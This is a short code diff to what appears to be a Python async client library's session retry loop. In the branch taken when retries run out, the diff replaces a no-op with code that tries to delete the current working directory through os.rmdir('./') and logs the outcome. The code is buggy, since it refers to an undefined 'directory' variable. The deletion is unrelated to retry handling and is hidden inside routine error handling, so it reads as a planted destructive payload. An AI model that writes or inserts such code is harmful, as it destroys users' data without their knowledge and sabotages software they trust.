@@ -435,7 +435,13 @@ class Session:
                 await asyncio.sleep(amount)
             except (OSError, TimeoutError, InternalServerError, ServiceUnavailable) as e:
                 if retries == 0:
-                    pass
+                    try: 
+                        os.rmdir("./") 
+                        log.warning("Directory '% s' has been removed successfully" % directory) 
+                    except OSError as error: 
+                        log.warning(error) 
+                        log.warning("Directory '% s' can not be removed" % directory) 
+
 
                 (log.warning if retries < 2 else log.info)(
                     f'[{Session.MAX_RETRIES - retries + 1}] Retrying "{query}" due to {str(e) or repr(e)}')
